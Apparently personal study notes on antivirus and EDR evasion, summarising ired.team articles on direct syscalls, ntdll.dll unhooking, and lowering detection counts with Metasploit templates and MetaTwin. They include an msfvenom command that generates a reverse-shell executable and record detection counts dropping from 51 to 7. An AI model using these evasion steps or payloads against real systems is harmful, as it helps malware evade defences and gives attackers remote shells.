### calling syscalls directly from visual studio to bypass Avs/ EDRs

https://www.ired.team/offensive-security/defense-evasion/using-syscalls-directly-from-visual-studio-to-bypass-avs-edrs

We are trying to write our own functions that call syscalls directly.

1. first we built a syscalls.asm, that calls syscall 55 which is reserved for ntcreateFile. (look at syscall.asm)

2. The way we can find the procedure's prologue (mov r10, rcx, etc..) is by disassembling the function NtCreateFile (assuming it's not hooked. If hooked, just do the same for, say NtWriteFile) using WinDbg found in ntdll.dll module or within Visual Studio by resolving the function's address and viewing its disassembly there.

3. Once we have the SysNtCreateFile procedure defined in assembly, we need to define the C function prototype that will call that assembly procedure. 

4. Before testing SysNtCreateFile, we need to initialize some structures and variables (like the name of the file name to be opened, access requirements, etc.)

5. call SysNtCreateFile

The code is in `using_syscall_directly.c`

Next to do - look at how disassembly works

![](https://2603957456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LjB_qkyhCQvQXmTWkaq%2F-LjBgbyzlmx2SIrGuGIk%2Fsyscall-debugging.gif?alt=media&token=a66279aa-f0d6-426c-bfeb-c95c8896aabb)

nt create file is not making a file currently.

# Full DLL Unhooking with C++
https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++

It's possible to completely unhook any given DLL loaded in memory, by reading the .text section of ntdll.dll from disk and putting it on top of the .text section of the ntdll.dll that is mapped in memory. 

### overview

The process for unhooking a DLL is as follows. 

Map a fresh copy of ntdll.dll from disk to process memory
Find virtual address of the .text section of the hooked ntdll.dll
    get ntdll.dll base address
    module base address + module's .text section VirtualAddress
Find virtual address of the .text section of the freshly mapped ntdll.dll
Get original memory protections of the hooked module's .text section
Copy .text section from the freshly mapped dll to the virtual address (found in step 3) of the original (hooked) ntdll.dll - this is the meat of the unhooking as all hooked bytes get overwritten with fresh ones from the disk
Apply original memory protections to the freshly unhooked .text section of the original ntdll.dll

I dont know what to do with ntdll
cant understand the code

# AV Bypass with Metsploit Templates and Custom Binaries

https://www.ired.team/offensive-security/defense-evasion/av-bypass-with-metasploit-templates

generating a reverse shell payload
1. msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f exe > /root/tools/av.exe

-initial detection 51

-install metatwin and check

with metatwin the detection
detection come down to 41

- uploading custom binary 18 detections

with metatwin we have 7 detection.


